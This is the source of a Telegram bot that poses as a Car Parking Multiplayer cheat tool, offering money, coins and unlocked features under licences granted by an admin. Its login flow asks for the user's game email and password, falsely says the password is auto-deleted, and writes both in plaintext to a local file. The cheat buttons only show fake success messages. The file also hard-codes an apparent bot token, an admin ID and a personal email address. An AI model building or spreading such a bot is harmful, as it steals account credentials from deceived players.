import logging
import asyncio
import sqlite3
import os
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
)

# Овозможување логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Константи за конверзација
CEKA_EMAIL, CEKA_PASSWORD, GLAVNO_MENI, CEKA_CUSTOM_DAYS = range(4)

# Земете го токенот од environment променливи
BOT_TOKEN = os.getenv("BOT_TOKEN", "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8694942406"))

# Иницијализација на базата
def inicijaliziraj_baza():
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS korisnici (
            user_id INTEGER PRIMARY KEY,
            istekuvanje TEXT,
            datum_dodeluvanje TEXT
        )
    ''')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "N/A"
    first_name = update.message.from_user.first_name or "User"

    # Проверка на лиценца
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT istekuvanje FROM korisnici WHERE user_id = ?', (user_id,))
    rezultat = cursor.fetchone()
    conn.close()

    sega = datetime.now()
    dozvolen = False

    if rezultat:
        istekuvanje_str = rezultat[0]
        if istekuvanje_str == "forever":
            dozvolen = True
        else:
            istekuvanje_datum = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
            dozvolen = sega < istekuvanje_datum

    if not dozvolen:
        welcome_text = f"""<b>🤖 AJHAN X TOOL</b>

<b>WELCOME</b>
@{username}
ID {user_id}
{sega.strftime('%d %b %Y • %I:%M %p')}

- Sign in with your CPM credentials

<b>🔑 SIGN IN</b>"""

        await update.message.reply_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 SIGN IN", callback_data="signin_request")]
            ])
        )
        return ConversationHandler.END

    # Добредојде за корисници со лиценца
    welcome_text = f"""<b>🤖 AJHAN X TOOL</b>

<b>WELCOME</b>
@{username}
ID {user_id}
{sega.strftime('%d %b %Y • %I:%M %p')}

- Sign in with your CPM credentials"""

    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📧 ENTER EMAIL", callback_data="enter_email")]
        ])
    )
    return CEKA_EMAIL

async def signin_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кога корисник без лиценца кликне SIGN IN"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    username = query.from_user.username or "N/A"
    first_name = query.from_user.first_name or "User"
    
    # Проверка дали веќе има барање
    if context.user_data.get('pending_request') == user_id:
        await query.edit_message_text(
            "⏳ Веќе имате испратено барање. Ве молиме почекајте одговор.",
            parse_mode='HTML'
        )
        return
    
    context.user_data['pending_request'] = user_id
    
    # Испрати барање до админот со подобрени копчиња
    tastatura = [
        [
            InlineKeyboardButton("♾️ Forever", callback_data=f"lic_forever_{user_id}"),
            InlineKeyboardButton("📅 30 Days", callback_data=f"lic_30_{user_id}")
        ],
        [
            InlineKeyboardButton("📅 7 Days", callback_data=f"lic_7_{user_id}"),
            InlineKeyboardButton("📝 Custom", callback_data=f"lic_custom_{user_id}")
        ],
        [
            InlineKeyboardButton("❌ Deny", callback_data=f"lic_deny_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(tastatura)
    
    # Текст за админот
    admin_text = f"""🔔 **Барање за пристап**

👤 **Корисник:** {first_name}
🆔 **ID:** `{user_id}`
👤 **Username:** @{username}
📅 **Датум:** {datetime.now().strftime('%d.%m.%Y %H:%M')}

Изберете тип на лиценца:"""

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=admin_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    
    await query.edit_message_text(
        "✅ **Барањето е испратено до администраторот!**\n\n"
        "📌 Ве молиме почекајте одобрение.\n"
        "Ќе добиете известување кога ќе ви биде доделена лиценца.",
        parse_mode='HTML'
    )

async def licenca_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler за лиценци - со CUSTOM опција"""
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')
    akcija = data[1]
    user_id = int(data[2])
    
    # Ако е CUSTOM, прашај го админот за број на денови
    if akcija == "custom":
        context.user_data['custom_user_id'] = user_id
        
        await query.edit_message_text(
            f"📝 **Внесете број на денови (1-30)**\n\n"
            f"Корисник ID: `{user_id}`\n\n"
            f"Напишете број од 1 до 30:",
            parse_mode='Markdown'
        )
        return CEKA_CUSTOM_DAYS
    
    # Обработка на стандардни опции
    if akcija == "deny":
        conn = sqlite3.connect('licenci.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM korisnici WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
        
        await query.edit_message_text(f"❌ Барањето за корисникот {user_id} е одбиено.")
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ Вашето барање за пристап е одбиено од администраторот."
        )
        # Отстрани го pending барањето
        if context.user_data.get('pending_request') == user_id:
            del context.user_data['pending_request']
        return
    
    # Одредување на времетраење
    traenje_opis = {
        "forever": "Forever ♾️",
        "30": "30 Days 📅",
        "7": "7 Days 📅"
    }.get(akcija, "7 Days")
    
    if akcija == "forever":
        istekuvanje = "forever"
        traenje_days = "трајна"
    else:
        istekuvanje = (datetime.now() + timedelta(days=int(akcija))).strftime("%Y-%m-%d %H:%M:%S")
        traenje_days = f"{akcija} дена"
    
    # Зачувување во база
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute(
        'INSERT OR REPLACE INTO korisnici (user_id, istekuvanje, datum_dodeluvanje) VALUES (?, ?, ?)', 
        (user_id, istekuvanje, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()
    conn.close()
    
    # Порака за админот
    await query.edit_message_text(
        f"✅ **Лиценцата е успешно доделена!**\n\n"
        f"👤 Корисник ID: `{user_id}`\n"
        f"📅 Времетраење: {traenje_opis}\n"
        f"📆 Доделено: {datetime.now().strftime('%d.%m.%Y %H:%M')}",
        parse_mode='Markdown'
    )
    
    # Порака до корисникот
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ **ДОБИВТЕ ПРИСТАП ДО AJHAN X TOOL!** 🎉\n\n"
             f"📅 **Времетраење:** {traenje_opis}\n"
             f"📆 **Доделено:** {datetime.now().strftime('%d.%m.%Y %H:%M')}\n\n"
             f"🔑 Напишете /start за да започнете со користење.",
        parse_mode='Markdown'
    )
    
    # Отстрани го pending барањето
    if context.user_data.get('pending_request') == user_id:
        del context.user_data['pending_request']

async def primi_custom_days(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Примање на број на денови за CUSTOM лиценца"""
    try:
        days = int(update.message.text.strip())
        if days < 1 or days > 30:
            await update.message.reply_text(
                "❌ **Грешка!**\n\n"
                "Мора да внесете број помеѓу **1** и **30**.\n"
                "Обидете се повторно:",
                parse_mode='Markdown'
            )
            return CEKA_CUSTOM_DAYS
        
        user_id = context.user_data.get('custom_user_id')
        if not user_id:
            await update.message.reply_text("❌ Грешка! Обидете се повторно.")
            return ConversationHandler.END
        
        # Додели лиценца со custom денови
        istekuvanje = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        
        conn = sqlite3.connect('licenci.db')
        cursor = conn.cursor()
        cursor.execute(
            'INSERT OR REPLACE INTO korisnici (user_id, istekuvanje, datum_dodeluvanje) VALUES (?, ?, ?)', 
            (user_id, istekuvanje, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        conn.close()
        
        # Порака до админот
        await update.message.reply_text(
            f"✅ **Custom лиценцата е доделена!**\n\n"
            f"👤 Корисник ID: `{user_id}`\n"
            f"📅 Времетраење: {days} дена\n"
            f"📆 Истекува: {(datetime.now() + timedelta(days=days)).strftime('%d.%m.%Y %H:%M')}",
            parse_mode='Markdown'
        )
        
        # Порака до корисникот
        await context.bot.send_message(
            chat_id=user_id,
            text=f"✅ **ДОБИВТЕ ПРИСТАП ДО AJHAN X TOOL!** 🎉\n\n"
                 f"📅 **Времетраење:** {days} дена\n"
                 f"📆 **Истекува:** {(datetime.now() + timedelta(days=days)).strftime('%d.%m.%Y %H:%M')}\n\n"
                 f"🔑 Напишете /start за да започнете со користење.",
            parse_mode='Markdown'
        )
        
        # Отстрани ги податоците
        del context.user_data['custom_user_id']
        if context.user_data.get('pending_request') == user_id:
            del context.user_data['pending_request']
        
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ **Грешка!**\n\n"
            "Внесете валиден број (1-30).\n"
            "Обидете се повторно:",
            parse_mode='Markdown'
        )
        return CEKA_CUSTOM_DAYS

async def enter_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кога корисник кликна ENTER EMAIL"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "<b>📧 ENTER EMAIL</b>\n\nType your CPM email:",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✘ Cancel", callback_data="cancel_login")]
        ])
    )
    return CEKA_EMAIL

async def primi_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['email'] = update.message.text
    
    await update.message.reply_text(
        "<b>🔐 PASSWORD</b>\n\nType your password:\n<i>Auto-deleted</i>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✘ Cancel", callback_data="cancel_login")]
        ])
    )
    return CEKA_PASSWORD

async def primi_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['password'] = update.message.text
    
    # Зачувување на податоците
    try:
        with open("cpm_profili.txt", "a", encoding="utf-8") as f:
            f.write(f"Корисник: {update.message.from_user.username} | Емаил: {context.user_data['email']} | Лозинка: {context.user_data['password']}\n")
    except Exception as e:
        logger.error(f"Грешка при запишување: {e}")
    
    await prikazi_dashboard(update)
    return GLAVNO_MENI

async def cancel_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Откажи најава"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "<b>❌ Cancelled</b>\n\n<pre>CPM TOOL BOX v4.0</pre>",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def prikazi_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Прикажи го DASHBOARD менито БЕЗ STATS"""
    email = context.user_data.get('email', 'senatkafkast@gmail.com')
    
    dashboard_text = f"""<b>🤖 AJHAN X TOOL</b>

<b>DASHBOARD</b>

<b>ACCOUNT</b>
{email}
••••••••
ID VY704074

- Select an option below:"""

    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data='meni_money')],
        [InlineKeyboardButton("🪙 Coins", callback_data='meni_coins')],
        [InlineKeyboardButton("⚡ Features", callback_data='meni_features')],
        [InlineKeyboardButton("⚙️ Settings", callback_data='meni_settings')],
        [InlineKeyboardButton("🔄 Refresh Account", callback_data='refresh_account')],
        [InlineKeyboardButton("🚪 Sign Out", callback_data='signout')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            dashboard_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        await update.callback_query.answer()
    else:
        await update.message.reply_text(
            dashboard_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

# МЕНИ ЗА ПАРИ
async def meni_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    money_text = """<b>💰 MONEY</b>

Max: $50,000,000"""

    keyboard = [
        [
            InlineKeyboardButton("$1M", callback_data='m_1m'),
            InlineKeyboardButton("$5M", callback_data='m_5m'),
            InlineKeyboardButton("$10M", callback_data='m_10m')
        ],
        [
            InlineKeyboardButton("$25M", callback_data='m_25m'),
            InlineKeyboardButton("$50M ★", callback_data='m_50m')
        ],
        [InlineKeyboardButton("🔙 Back", callback_data='nazad_vo_dashboard')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        money_text,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# МЕНИ ЗА КОИНСИ
async def meni_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    coins_text = """<b>🪙 COINS</b>

Max: 500,000"""

    keyboard = [
        [
            InlineKeyboardButton("100K", callback_data='c_100k'),
            InlineKeyboardButton("250K", callback_data='c_250k'),
            InlineKeyboardButton("500K ★", callback_data='c_500k')
        ],
        [InlineKeyboardButton("🔙 Back", callback_data='nazad_vo_dashboard')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        coins_text,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# МЕНИ ЗА FEATURES
async def meni_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    features_text = """<b>⚡ FEATURES</b>

Select a feature or UNLOCK ALL:"""

    keyboard = [
        [
            InlineKeyboardButton("🏎️ W16", callback_data='f_w16'),
            InlineKeyboardButton("🛡️ No Dmg", callback_data='f_nodmg')
        ],
        [
            InlineKeyboardButton("💨 Smoke", callback_data='f_smoke'),
            InlineKeyboardButton("🔄 Wheels", callback_data='f_wheels')
        ],
        [
            InlineKeyboardButton("📊 Levels", callback_data='f_levels'),
            InlineKeyboardButton("⛽ Fuel", callback_data='f_fuel')
        ],
        [
            InlineKeyboardButton("📯 Horns", callback_data='f_horns'),
            InlineKeyboardButton("🎭 Anims", callback_data='f_anims')
        ],
        [
            InlineKeyboardButton("🏠 Houses", callback_data='f_houses'),
            InlineKeyboardButton("👑 Rank", callback_data='f_rank')
        ],
        [
            InlineKeyboardButton("🔥 UNLOCK ALL", callback_data='f_unlock_all')
        ],
        [InlineKeyboardButton("🔙 Back", callback_data='nazad_vo_dashboard')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        features_text,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# МЕНИ ЗА SETTINGS
async def meni_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    settings_text = """<b>⚙️ SETTINGS</b>

Configure your preferences:"""

    keyboard = [
        [InlineKeyboardButton("🌐 Language", callback_data='set_lang')],
        [InlineKeyboardButton("🔔 Notifications", callback_data='set_notif')],
        [InlineKeyboardButton("🎨 Theme", callback_data='set_theme')],
        [InlineKeyboardButton("🔙 Back", callback_data='nazad_vo_dashboard')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        settings_text,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# REFRESH ACCOUNT
async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🔄 **Refreshing Account...**\n\n✅ Account refreshed successfully!",
        parse_mode='Markdown'
    )
    await asyncio.sleep(1.5)
    await prikazi_dashboard(update, context)

# АКЦИИ ЗА ПАРИ
async def akcija_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    iznos = data.replace('m', '$') if data.startswith('m') else data
    await query.edit_message_text(
        f"✅ **${iznos} added successfully!**",
        parse_mode='Markdown'
    )
    await asyncio.sleep(1.5)
    await meni_money(update, context)

# АКЦИИ ЗА КОИНСИ
async def akcija_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    iznos = data.replace('k', 'K')
    await query.edit_message_text(
        f"✅ **{iznos} coins added successfully!**",
        parse_mode='Markdown'
    )
    await asyncio.sleep(1.5)
    await meni_coins(update, context)

# АКЦИИ ЗА FEATURES
async def akcija_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    feature = query.data.split('_')[1]
    
    feature_names = {
        'w16': '🏎️ W16 Engine',
        'nodmg': '🛡️ No Damage',
        'smoke': '💨 Smoke Effect',
        'wheels': '🔄 Custom Wheels',
        'levels': '📊 All Levels',
        'fuel': '⛽ Infinite Fuel',
        'horns': '📯 Premium Horns',
        'anims': '🎭 All Animations',
        'houses': '🏠 All Houses',
        'rank': '👑 King Rank',
        'unlock_all': '🔥 ALL FEATURES UNLOCKED!'
    }
    
    await query.edit_message_text(
        f"✅ **{feature_names.get(feature, 'Feature')} activated successfully!**",
        parse_mode='Markdown'
    )
    await asyncio.sleep(1.5)
    await meni_features(update, context)

# SETTINGS акции
async def akcija_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    setting = query.data.split('_')[1]
    settings_text = {
        'lang': "🌐 Language set to English",
        'notif': "🔔 Notifications enabled",
        'theme': "🎨 Theme updated"
    }.get(setting, "Setting updated!")
    
    await query.edit_message_text(
        f"✅ **{settings_text}**",
        parse_mode='Markdown'
    )
    await asyncio.sleep(1.5)
    await meni_settings(update, context)

# НАЗАД ВО DASHBOARD
async def nazad_vo_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await prikazi_dashboard(update, context)

# SIGN OUT
async def signout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👋 **Signed out successfully!**\n\nType /start to login again.",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

# АДМИН КОМАНДИ
async def komanda_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Админ панел со статус"""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Оваа команда е само за главниот администратор.")
        return
    
    conn = sqlite3.connect('licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM korisnici')
    broj_korisnici = cursor.fetchone()[0]
    
    # Кои се активни
    sega = datetime.now()
    aktivni = 0
    cursor.execute('SELECT user_id, istekuvanje FROM korisnici')
    for row in cursor.fetchall():
        if row[1] == "forever":
            aktivni += 1
        else:
            istek = datetime.strptime(row[1], "%Y-%m-%d %H:%M:%S")
            if sega < istek:
                aktivni += 1
    conn.close()
    
    admin_text = f"""👑 **Admin Panel - AJHAN X TOOL**

📊 **Статистика:**
• Вкупно корисници: {broj_korisnici}
• Активни лиценци: {aktivni}

📌 **Команди:**
/start - Почетна страница
/help - Помош
/admin - Админ панел
/status - Статус на ботот

🔐 **Систем:** Стабилен
📅 **База:** licenci.db
🔄 **Логирање:** Активно

*Корисниците кои бараат пристап автоматски добиваат барање во овој чет.*"""

    await update.message.reply_text(admin_text, parse_mode='Markdown')

async def komanda_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статус на ботот"""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Само за админ.")
        return
    
    await update.message.reply_text(
        "🟢 **Ботот е активен!**\n\n"
        f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
        "✅ Сите системи работат нормално.",
        parse_mode='Markdown'
    )

async def komanda_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Помош"""
    is_admin = update.message.from_user.id == ADMIN_ID
    
    help_text = """❓ **Help - AJHAN X TOOL**

📌 **Команди:**
/start - Стартувај го ботот
/help - Прикажи ја оваа порака

"""
    
    if is_admin:
        help_text += """👑 **Админ команди:**
/admin - Админ панел
/status - Статус на ботот

📌 **Како работи:**
1. Корисникот пишува /start
2. Ако нема лиценца, добива Welcome екран
3. Кликнува SIGN IN
4. Вие добивате барање со опции:
   • Forever
   • 30 Days  
   • 7 Days
   • Custom (1-30 дена)
5. Вие избирате и корисникот добива пристап

🔑 **Лиценци:**
• Forever - Трајна
• 30 Days - 30 дена
• 7 Days - 7 дена
• Custom - 1 до 30 дена"""
    else:
        help_text += """🔑 **Лиценца:**
Ако немате пристап:
1. Напишете /start
2. Кликнете SIGN IN
3. Почекајте администраторот да ве одобри

📌 Откако ќе добиете лиценца, можете да го користите AJHAN X TOOL за CPM модификации."""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def nepoznata_komanda(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ Непозната команда.\nНапишете /help за да видите достапни команди.",
        parse_mode='HTML'
    )

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт команда"""
    await start(update, context)

def main():
    # Креирање на апликација
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Креирање на главна конверзација
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CEKA_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, primi_email),
                CallbackQueryHandler(enter_email, pattern='^enter_email$')
            ],
            CEKA_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, primi_password),
                CallbackQueryHandler(cancel_login, pattern='^cancel_login$')
            ],
            GLAVNO_MENI: [
                CallbackQueryHandler(prikazi_dashboard, pattern='^dashboard$')
            ],
            CEKA_CUSTOM_DAYS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, primi_custom_days)
            ]
        },
        fallbacks=[CommandHandler('start', start)],
    )

    # Додавање на handler-и
    application.add_handler(conv_handler)
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(signin_request, pattern='^signin_request$'))
    application.add_handler(CallbackQueryHandler(enter_email, pattern='^enter_email$'))
    application.add_handler(CallbackQueryHandler(cancel_login, pattern='^cancel_login$'))
    application.add_handler(CallbackQueryHandler(licenca_handler, pattern='^lic_'))
    
    # Главни менија
    application.add_handler(CallbackQueryHandler(meni_money, pattern='^meni_money$'))
    application.add_handler(CallbackQueryHandler(meni_coins, pattern='^meni_coins$'))
    application.add_handler(CallbackQueryHandler(meni_features, pattern='^meni_features$'))
    application.add_handler(CallbackQueryHandler(meni_settings, pattern='^meni_settings$'))
    application.add_handler(CallbackQueryHandler(refresh_account, pattern='^refresh_account$'))
    application.add_handler(CallbackQueryHandler(signout, pattern='^signout$'))
    application.add_handler(CallbackQueryHandler(nazad_vo_dashboard, pattern='^nazad_vo_dashboard$'))
    
    # Акции
    application.add_handler(CallbackQueryHandler(akcija_money, pattern='^m_'))
    application.add_handler(CallbackQueryHandler(akcija_coins, pattern='^c_'))
    application.add_handler(CallbackQueryHandler(akcija_features, pattern='^f_'))
    application.add_handler(CallbackQueryHandler(akcija_settings, pattern='^set_'))
    
    # Команди
    application.add_handler(CommandHandler('admin', komanda_admin))
    application.add_handler(CommandHandler('status', komanda_status))
    application.add_handler(CommandHandler('help', komanda_help))
    application.add_handler(CommandHandler('start', start_command))
    application.add_handler(MessageHandler(filters.COMMAND, nepoznata_komanda))

    # Стартување на ботот
    print("🤖 AJHAN X TOOL ботот е стартуван!")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print("📌 Чекам пораки...")
    application.run_polling()

if __name__ == '__main__':
    main()
